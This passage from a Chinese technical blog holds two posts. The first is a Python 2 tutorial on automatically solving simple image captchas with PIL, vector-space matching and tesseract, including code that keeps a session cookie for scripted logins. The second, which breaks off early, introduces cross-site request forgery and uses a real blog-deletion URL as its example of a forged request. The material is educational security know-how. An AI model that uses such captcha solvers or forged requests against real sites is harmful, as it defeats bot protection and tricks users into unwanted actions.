<p>这样我们就得到了很多种颜色，而很明显的，在验证码里面我们只需要红色和灰色，其他的我们可以视为杂色排除。而通过这样我们就能过构造出一个灰色图出来。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">#-*- coding:utf8 -*-</div><div class="line">from PIL import Image</div><div class="line"></div><div class="line">im = Image.open(&quot;captcha.gif&quot;)</div><div class="line">im = im.convert(&quot;P&quot;)</div><div class="line">im2 = Image.new(&quot;P&quot;,im.size,255)</div><div class="line"></div><div class="line">for x in range(im.size[1]):</div><div class="line">    for y in range(im.size[0]):</div><div class="line">        pix = im.getpixel((y,x))</div><div class="line">        if pix == 220 or pix == 227: # these are the numbers to get</div><div class="line">            im2.putpixel((y,x),0)</div><div class="line"></div><div class="line">im2.show()</div></pre></td></tr></table></figure></p>
<p>这样我们就得到了只有红色和灰色的图像，这就比较容易辨识了。</p>
<h1 id="提取单个字符"><a href="#提取单个字符" class="headerlink" title="提取单个字符"></a>提取单个字符</h1><p>由于这种字符比较简单，我们就直接纵向切割，提取单个字符就可以了。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">inletter = <span class="keyword">False</span></div><div class="line">foundletter=<span class="keyword">False</span></div><div class="line">start = <span class="number">0</span></div><div class="line">end = <span class="number">0</span></div><div class="line"></div><div class="line">letters = []</div><div class="line"></div><div class="line"><span class="keyword">for</span> y <span class="keyword">in</span> range(im2.size[<span class="number">0</span>]): </div><div class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(im2.size[<span class="number">1</span>]):</div><div class="line">        pix = im2.getpixel((y,x))</div><div class="line">        <span class="keyword">if</span> pix != <span class="number">255</span>:</div><div class="line">            inletter = <span class="keyword">True</span></div><div class="line">    <span class="keyword">if</span> foundletter == <span class="keyword">False</span> <span class="keyword">and</span> inletter == <span class="keyword">True</span>:</div><div class="line">        foundletter = <span class="keyword">True</span></div><div class="line">        start = y</div><div class="line"></div><div class="line">    <span class="keyword">if</span> foundletter == <span class="keyword">True</span> <span class="keyword">and</span> inletter == <span class="keyword">False</span>:</div><div class="line">        foundletter = <span class="keyword">False</span></div><div class="line">        end = y</div><div class="line">        letters.append((start,end))</div><div class="line"></div><div class="line">    inletter=<span class="keyword">False</span></div><div class="line"><span class="keyword">print</span> letters</div></pre></td></tr></table></figure></p>
<p>这样就输出：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[(<span class="number">6</span>, <span class="number">14</span>), (<span class="number">15</span>, <span class="number">25</span>), (<span class="number">27</span>, <span class="number">35</span>), (<span class="number">37</span>, <span class="number">46</span>), (<span class="number">48</span>, <span class="number">56</span>), (<span class="number">57</span>, <span class="number">67</span>)]</div></pre></td></tr></table></figure></p>
<p>这样就可以知道每个字符开始和结束的序列号。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> hashlib</div><div class="line"><span class="keyword">import</span> time</div><div class="line"></div><div class="line">count = <span class="number">0</span></div><div class="line"><span class="keyword">for</span> letter <span class="keyword">in</span> letters:</div><div class="line">    m = hashlib.md5()</div><div class="line">    im3 = im2.crop(( letter[<span class="number">0</span>] , <span class="number">0</span>, letter[<span class="number">1</span>],im2.size[<span class="number">1</span>] ))</div><div class="line">    m.update(<span class="string">"%s%s"</span>%(time.time(),count))</div><div class="line">    im3.save(<span class="string">"./%s.gif"</span>%(m.hexdigest()))</div><div class="line">    count += <span class="number">1</span></div></pre></td></tr></table></figure></p>
<p>对图像进行切割就可以得到字符了。</p>
<h1 id="向量空间搜索"><a href="#向量空间搜索" class="headerlink" title="向量空间搜索"></a>向量空间搜索</h1><p>在这里我们使用向量空间搜索引擎来做字符识别，它具有很多优点：</p>
<ul>
<li>不需要大量的训练迭代</li>
<li>不会训练过度</li>
<li>你可以随时加入／移除错误的数据查看效果</li>
<li>很容易理解和编写成代码</li>
<li>提供分级结果，你可以查看最接近的多个匹配</li>
<li>对于无法识别的东西只要加入到搜索引擎中，马上就能识别了。<br>当然它也有缺点，例如分类的速度比神经网络慢很多，它不能找到自己的方法解决问题等等。</li>
</ul>
<p>举个例子，你有3篇文档，筛选出其中的单词作为特征，对应单词的数量作为特征的值。取n个单词就生成一个n维空间，而每一篇文档就是在这个空间中的矢量，我们只要计算矢量之间的角度就能得到文章的相似度了。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> math</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">VectorCompare</span>:</span></div><div class="line">    <span class="comment">#计算矢量大小</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">magnitude</span><span class="params">(self,concordance)</span>:</span></div><div class="line">        total = <span class="number">0</span></div><div class="line">        <span class="keyword">for</span> word,count <span class="keyword">in</span> concordance.iteritems():</div><div class="line">            total += count ** <span class="number">2</span></div><div class="line">        <span class="keyword">return</span> math.sqrt(total)</div><div class="line"></div><div class="line">    <span class="comment">#计算矢量之间的 cos 值</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">relation</span><span class="params">(self,concordance1, concordance2)</span>:</span></div><div class="line">        relevance = <span class="number">0</span></div><div class="line">        topvalue = <span class="number">0</span></div><div class="line">        <span class="keyword">for</span> word, count <span class="keyword">in</span> concordance1.iteritems():</div><div class="line">            <span class="keyword">if</span> concordance2.has_key(word):</div><div class="line">                topvalue += count * concordance2[word]</div><div class="line">        <span class="keyword">return</span> topvalue / (self.magnitude(concordance1) * self.magnitude(concordance2))</div></pre></td></tr></table></figure></p>
<p>这样他就会计算两个Python的字典类型并且输出他们的相似度。</p>
<p>取大量验证码提取单个字符图片作为训练集合的工作，但只要是有好好读上文的同学就一定知道这些工作要怎么做，在这里就略去了。可以直接使用提供的训练集合来进行下面的操作。</p>
<p>iconset目录下放的是我们的训练集。</p>
<p>最后追加的内容：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#将图片转换为矢量</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">buildvector</span><span class="params">(im)</span>:</span></div><div class="line">    d1 = &#123;&#125;</div><div class="line">    count = <span class="number">0</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> im.getdata():</div><div class="line">        d1[count] = i</div><div class="line">        count += <span class="number">1</span></div><div class="line">    <span class="keyword">return</span> d1</div><div class="line"></div><div class="line">v = VectorCompare()</div><div class="line"></div><div class="line">iconset = [<span class="string">'0'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>,<span class="string">'0'</span>,<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'i'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'l'</span>,<span class="string">'m'</span>,<span class="string">'n'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,<span class="string">'q'</span>,<span class="string">'r'</span>,<span class="string">'s'</span>,<span class="string">'t'</span>,<span class="string">'u'</span>,<span class="string">'v'</span>,<span class="string">'w'</span>,<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>]</div><div class="line"></div><div class="line"><span class="comment">#加载训练集</span></div><div class="line">imageset = []</div><div class="line"><span class="keyword">for</span> letter <span class="keyword">in</span> iconset:</div><div class="line">    <span class="keyword">for</span> img <span class="keyword">in</span> os.listdir(<span class="string">'./iconset/%s/'</span>%(letter)):</div><div class="line">        temp = []</div><div class="line">        <span class="keyword">if</span> img != <span class="string">"Thumbs.db"</span> <span class="keyword">and</span> img != <span class="string">".DS_Store"</span>:</div><div class="line">            temp.append(buildvector(Image.open(<span class="string">"./iconset/%s/%s"</span>%(letter,img))))</div><div class="line">        imageset.append(&#123;letter:temp&#125;)</div><div class="line"></div><div class="line">count = <span class="number">0</span></div><div class="line"><span class="comment">#对验证码图片进行切割</span></div><div class="line"><span class="keyword">for</span> letter <span class="keyword">in</span> letters:</div><div class="line">    m = hashlib.md5()</div><div class="line">    im3 = im2.crop(( letter[<span class="number">0</span>] , <span class="number">0</span>, letter[<span class="number">1</span>],im2.size[<span class="number">1</span>] ))</div><div class="line"></div><div class="line">    guess = []</div><div class="line"></div><div class="line">    <span class="comment">#将切割得到的验证码小片段与每个训练片段进行比较</span></div><div class="line">    <span class="keyword">for</span> image <span class="keyword">in</span> imageset:</div><div class="line">        <span class="keyword">for</span> x,y <span class="keyword">in</span> image.iteritems():</div><div class="line">            <span class="keyword">if</span> len(y) != <span class="number">0</span>:</div><div class="line">                guess.append( ( v.relation(y[<span class="number">0</span>],buildvector(im3)),x) )</div><div class="line"></div><div class="line">    guess.sort(reverse=<span class="keyword">True</span>)</div><div class="line">    <span class="keyword">print</span> <span class="string">""</span>,guess[<span class="number">0</span>]</div><div class="line">    count += <span class="number">1</span></div></pre></td></tr></table></figure></p>
<p>下面就是全部代码了：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</div><div class="line"><span class="keyword">import</span> hashlib</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">import</span> os</div><div class="line"></div><div class="line"><span class="keyword">import</span> math</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">VectorCompare</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">magnitude</span><span class="params">(self,concordance)</span>:</span></div><div class="line">        total = <span class="number">0</span></div><div class="line">        <span class="keyword">for</span> word,count <span class="keyword">in</span> concordance.iteritems():</div><div class="line">            total += count ** <span class="number">2</span></div><div class="line">        <span class="keyword">return</span> math.sqrt(total)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">relation</span><span class="params">(self,concordance1, concordance2)</span>:</span></div><div class="line">        relevance = <span class="number">0</span></div><div class="line">        topvalue = <span class="number">0</span></div><div class="line">        <span class="keyword">for</span> word, count <span class="keyword">in</span> concordance1.iteritems():</div><div class="line">            <span class="keyword">if</span> concordance2.has_key(word):</div><div class="line">                topvalue += count * concordance2[word]</div><div class="line">        <span class="keyword">return</span> topvalue / (self.magnitude(concordance1) * self.magnitude(concordance2))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">buildvector</span><span class="params">(im)</span>:</span></div><div class="line">    d1 = &#123;&#125;</div><div class="line"></div><div class="line">    count = <span class="number">0</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> im.getdata():</div><div class="line">        d1[count] = i</div><div class="line">        count += <span class="number">1</span></div><div class="line"></div><div class="line">    <span class="keyword">return</span> d1</div><div class="line"></div><div class="line">v = VectorCompare()</div><div class="line"></div><div class="line">iconset = [<span class="string">'0'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>,<span class="string">'0'</span>,<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'i'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'l'</span>,<span class="string">'m'</span>,<span class="string">'n'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,<span class="string">'q'</span>,<span class="string">'r'</span>,<span class="string">'s'</span>,<span class="string">'t'</span>,<span class="string">'u'</span>,<span class="string">'v'</span>,<span class="string">'w'</span>,<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>]</div><div class="line"></div><div class="line">imageset = []</div><div class="line"></div><div class="line"><span class="keyword">for</span> letter <span class="keyword">in</span> iconset:</div><div class="line">    <span class="keyword">for</span> img <span class="keyword">in</span> os.listdir(<span class="string">'./iconset/%s/'</span>%(letter)):</div><div class="line">        temp = []</div><div class="line">        <span class="keyword">if</span> img != <span class="string">"Thumbs.db"</span> <span class="keyword">and</span> img != <span class="string">".DS_Store"</span>: <span class="comment"># windows check...</span></div><div class="line">            temp.append(buildvector(Image.open(<span class="string">"./iconset/%s/%s"</span>%(letter,img))))</div><div class="line">        imageset.append(&#123;letter:temp&#125;)</div><div class="line"></div><div class="line">im = Image.open(<span class="string">"captcha.gif"</span>)</div><div class="line">im2 = Image.new(<span class="string">"P"</span>,im.size,<span class="number">255</span>)</div><div class="line">im = im.convert(<span class="string">"P"</span>)</div><div class="line">temp = &#123;&#125;</div><div class="line"></div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(im.size[<span class="number">1</span>]):</div><div class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(im.size[<span class="number">0</span>]):</div><div class="line">        pix = im.getpixel((y,x))</div><div class="line">        temp[pix] = pix</div><div class="line">        <span class="keyword">if</span> pix == <span class="number">220</span> <span class="keyword">or</span> pix == <span class="number">227</span>: <span class="comment"># these are the numbers to get</span></div><div class="line">            im2.putpixel((y,x),<span class="number">0</span>)</div><div class="line"></div><div class="line">inletter = <span class="keyword">False</span></div><div class="line">foundletter=<span class="keyword">False</span></div><div class="line">start = <span class="number">0</span></div><div class="line">end = <span class="number">0</span></div><div class="line"></div><div class="line">letters = []</div><div class="line"></div><div class="line"><span class="keyword">for</span> y <span class="keyword">in</span> range(im2.size[<span class="number">0</span>]): <span class="comment"># slice across</span></div><div class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(im2.size[<span class="number">1</span>]): <span class="comment"># slice down</span></div><div class="line">        pix = im2.getpixel((y,x))</div><div class="line">        <span class="keyword">if</span> pix != <span class="number">255</span>:</div><div class="line">            inletter = <span class="keyword">True</span></div><div class="line"></div><div class="line">    <span class="keyword">if</span> foundletter == <span class="keyword">False</span> <span class="keyword">and</span> inletter == <span class="keyword">True</span>:</div><div class="line">        foundletter = <span class="keyword">True</span></div><div class="line">        start = y</div><div class="line"></div><div class="line">    <span class="keyword">if</span> foundletter == <span class="keyword">True</span> <span class="keyword">and</span> inletter == <span class="keyword">False</span>:</div><div class="line">        foundletter = <span class="keyword">False</span></div><div class="line">        end = y</div><div class="line">        letters.append((start,end))</div><div class="line"></div><div class="line">    inletter=<span class="keyword">False</span></div><div class="line"></div><div class="line">count = <span class="number">0</span></div><div class="line"><span class="keyword">for</span> letter <span class="keyword">in</span> letters:</div><div class="line">    m = hashlib.md5()</div><div class="line">    im3 = im2.crop(( letter[<span class="number">0</span>] , <span class="number">0</span>, letter[<span class="number">1</span>],im2.size[<span class="number">1</span>] ))</div><div class="line"></div><div class="line">    guess = []</div><div class="line"></div><div class="line">    <span class="keyword">for</span> image <span class="keyword">in</span> imageset:</div><div class="line">        <span class="keyword">for</span> x,y <span class="keyword">in</span> image.iteritems():</div><div class="line">            <span class="keyword">if</span> len(y) != <span class="number">0</span>:</div><div class="line">                guess.append( ( v.relation(y[<span class="number">0</span>],buildvector(im3)),x) )</div><div class="line"></div><div class="line">    guess.sort(reverse=<span class="keyword">True</span>)</div><div class="line">    <span class="keyword">print</span> <span class="string">""</span>,guess[<span class="number">0</span>]</div><div class="line"></div><div class="line">    count += <span class="number">1</span></div></pre></td></tr></table></figure></p>
<p>这样直接运行就可以得到我们的验证码信息了。</p>
<h1 id="pytesser库"><a href="#pytesser库" class="headerlink" title="pytesser库"></a>pytesser库</h1><ol>
<li>pytesser依赖于PIL,因此需要先安装PIL模块，详见：<a href="http://wenyue.me/blog/278" target="_blank" rel="external">http://wenyue.me/blog/278</a></li>
<li>pytesser调用了tesseract，因此需要安装tesseract：<br>先用包管理器安装这几个库：<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install libpng12-dev</div><div class="line">sudo apt-get install libjpeg62-dev</div><div class="line">sudo apt-get install libtiff4-dev</div><div class="line">sudo apt-get install zlibg-dev</div></pre></td></tr></table></figure>
</li>
</ol>
<p>下载tesseract的源码包：<a href="http://tesseract-ocr.googlecode.com/files/tesseract-3.00.tar.gz" target="_blank" rel="external">http://tesseract-ocr.googlecode.com/files/tesseract-3.00.tar.gz</a><br>解压、cd到解压后目录下tesseract-3.00/<br>运行./configure -prefix=你想要安装到的路径，比如:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./configure --prefix=/home/pf-miles/installation/install/tesseract</div></pre></td></tr></table></figure>
<p>然后make &amp; make install<br>将tesseract的运行脚本加到环境变量中，比如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">export PATH=$PATH:/home/pf-miles/installation/install/tesseract/bin</div></pre></td></tr></table></figure>
<p>, 这个路径与刚才你configure的时候设置的路径有关<br>到<a href="http://code.google.com/p/tesseract-ocr/downloads/list" target="_blank" rel="external">http://code.google.com/p/tesseract-ocr/downloads/list</a>页 面去下载最新的<code>eng.traineddata.gz</code>文件，解压后的<code>eng.traineddata</code>放到<code>/home/pf-miles /installation/install/tesseract/share/tessdata</code>目录下，注意，虽然tesseract的svn trunk里也有这个文件，但那个用不得，会报</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">actual_tessdata_num_entries_ &lt;= TESSDATA_NUM_ENTRIES:Error:Assert failed:in file tessdatamanager.cpp, line 55</div></pre></td></tr></table></figure>
<p>错误，详见：<a href="http://www.uluga.ubuntuforums.org/showthread.php?p=10248384" target="_blank" rel="external">http://www.uluga.ubuntuforums.org/showthread.php?p=10248384</a>，所以一定要用<a href="http://code.google.com/p/tesseract-ocr/downloads/list" target="_blank" rel="external">http://code.google.com/p/tesseract-ocr/downloads/list</a>这里下载的那一份<br>试一试：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">tesseract</div><div class="line">Usage:tesseract imagename outputbase [-l lang] [configfile [[+|-]varfile]...]</div></pre></td></tr></table></figure>
<p>OK,tesseract安装完毕</p>
<ol>
<li>下载pytesser包：<a href="http://pytesser.googlecode.com/files/pytesser_v0.0.1.zip" target="_blank" rel="external">http://pytesser.googlecode.com/files/pytesser_v0.0.1.zip</a>(目前是0.0.1版本), 解压…并cd到解压后的目录下</li>
<li>目录下有个“phototest.tif”图片文件作为测试用，直接在目录下写一个python脚本进行测试：<br>test.py:<br>from pytesser import * im = Image.open(‘phototest.tif’) text = image_to_string(im) print text<br>运行：</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python test.py 2</div></pre></td></tr></table></figure>
<p>结果：<br>Thls IS a lot of 12 pornt text to test the<br>ocr code and see lf It works on all types<br>of frle format<br>lazy fox The qurck brown dog jumped<br>over the lazy fox The qulck brown dog<br>jumped over the lazy fox The QUICK<br>brown dog jumped over the lazy fox<br>The quick brown dog jumped over the<br>应该说准确率还令人满意吧</p>
<p>pytesser的验证码识别能力比较低，只能对规规矩矩不歪不斜数字和字母验证码进行识别，这里还是要介绍下它的用法。有关它的安装和python对应的模块可以参考<a href="http://wenyue.me/blog/tag/pytesser" target="_blank" rel="external">http://wenyue.me/blog/tag/pytesser</a>。<br>pytesser只能对tiff（tif）格式的图片文件进行识别，大部分网站的验证码图片不是tiff格式的，所以需要进行转换。可使用Image模块转化图片格式：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#需要保存成tmp.tiff，发现保存成tmp.tif的话pytesser无法识别</span></div><div class="line">Image.open(‘tmp.gif’).convert(‘RGB’).save(‘tmp.tiff’)</div></pre></td></tr></table></figure></p>
<p>获取验证码的时候需要让对方服务器写如cookie，所以需要以下这段<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">jk = cookielib.LWPCookieJar()</div><div class="line">cookies = urllib2.HTTPCookieProcessor(jk)</div><div class="line">opener = urllib2.build_opener(cookies)</div></pre></td></tr></table></figure></p>
<p>然后再需要拿着这个opener去登录， 登录成功后的，再去请求其他需要登录的页面的时候也需要使用这个opener去urlopen</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://kidozh.github.io/2016/07/13/e8-b7-a8-e7-ab-99-e7-82-b9-e8-af-b7-e6-b1-82-e4-bc-aa-e9-80-a0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="kido zhang">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="kidozh">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/07/13/e8-b7-a8-e7-ab-99-e7-82-b9-e8-af-b7-e6-b1-82-e4-bc-aa-e9-80-a0/" itemprop="url">跨站点请求伪造</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-07-13T01:20:17+08:00">
                2016-07-13
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/安全工程/" itemprop="url" rel="index">
                    <span itemprop="name">安全工程</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="CSRF简介"><a href="#CSRF简介" class="headerlink" title="CSRF简介"></a>CSRF简介</h1><p>CSRF全称是Cross Site Request Forgery，也就是跨站点请求伪造，是一种很常见的Web攻击。</p>
<p>在很多网站的操作中，往往使用者只需要一个Cookie和参数就可以对其内容的增添或者删除的操作，比如搜狐的博客就有：</p>
<p><code>http://blog.sohu.com/manage/entry.do?m=delete&amp;id=156713012</code></p>
<p>这样当用户登陆的时候，就能通过访问这个连接达到删除博客的目的。这样假设我们诱导用户访问上面的地址，用户就会神不知鬼不觉的删除自己的文章。 这个删除博客文章的请求，就是攻击者所伪造的，所以这种攻击就被成为跨站点请求伪造。</p>
<h1 id="CSRF进阶"><a href="#CSRF进阶" class="headerlink" title="CSRF进阶"></a>CSRF进阶</h1><h2 id="浏览器Cookie策略"><a href="#浏览器Cookie策略" class="headerlink" title="浏览器Cookie策略"></a>浏览器Cookie策略</h2><p>上面的例子中，攻击者伪造的请求之所以可以被服务器验证通过，是因为用户的浏览器成功的发送了Cookie的缘故。</p>
<p>浏览器所持有的Cookie分为两种：一种是Session Cookie，也就是临时Cookie；另一种是Third-party Cookie，也就是本地Cookie。</p>
<p>两者的区别再与Third-Party Cookie在Set-Cookie时候就指定了Expire的时间，只有到了Expire时间后Cookie才会是小，所以这种Cookie会保存在本地；而Session Cookie则没有指定Expire的时间，所以当浏览器关闭的时候，Cookie也失效了。</p>
<p>也就是说，Session Cookie在全浏览器的生命周期，即使浏览器打开了一个新的Tab页，Session Cookie也都是有效的。Session Cookie保存在浏览器的内存空间中；而Third-Party Cookie则保存在本地。</p>
<p>如果浏览器从一个域的页面中，要加载另一个域的资源，由于安全原因，某些浏览器会阻止Third-party Cookie的发送。</p>
<p>需要说明的是IE出于安全的考虑，默认禁止了浏览器在<code>&lt;img&gt;</code>、<code>&lt;iframe&gt;</code>、<code>&lt;script&gt;</code>、<code>&lt;link&gt;</code>等标签中发送第三方Cookie。而Firefox默认的策略是允许发送第三方cookie的。</p>
<p>目前主流的浏览器之中，默认会拦截Third-party Cookie的有：IE、Safari；不会拦截的则有：Firefox、Opera、Chrome、Android等。但是CSRF攻击的目标如果不需要使用cookie，那么也不必考虑浏览器的Cookie策略了。</p>
<h2 id="P3P头的副作用"><a href="#P3P头的副作用" class="headerlink" title="P3P头的副作用"></a>P3P头的副作用</h2><p>尽管有些CSRF攻击的实施起来不需要认证，不需要发送Cookie，但是不可否认的是，大部分敏感的操作都是躲在认证之后的。因此浏览器拦截第三方Cookie的发送，在某种程度上来说降低了CSRF攻击的威力。</p>
<p>但是P3P的介入却使得情况变得复杂。P3P是W3C指定的一项关于隐私的标准，全称是The Platform for Privacy Preferences。</p>
<p>如果网站返回给浏览器的HTTP头包含了P3P头，则在某种程度上来说，会允许浏览器发送第三方Cookie，在IE下即使是<code>&lt;iframe&gt;</code>和<code>&lt;script&gt;</code>也不会在拦截第三方Cookie的发送。</p>
<p>在网站的业务中，P3P主要用于类似广告等需要跨域访问的页面。但是很遗憾的是，P3P头设置后，对于Cookie的影响将扩大到整个域中的所有页面，因为Cookie是以域和path为单位的，所以不满足最小权限的要求。</p>
<p>假设有www.a.com和www.b.com两个域，在www.b.com上有一个页面，其中包含一个指向www.a.com的iframe。</p>
<p>如果www.b.com/test.html的内容为:</p>
<p><code>&lt;iframe width=300 height=300 src=&quot;http://www.a.com/test.php&quot;&gt;&lt;/iframe&gt;</code></p>
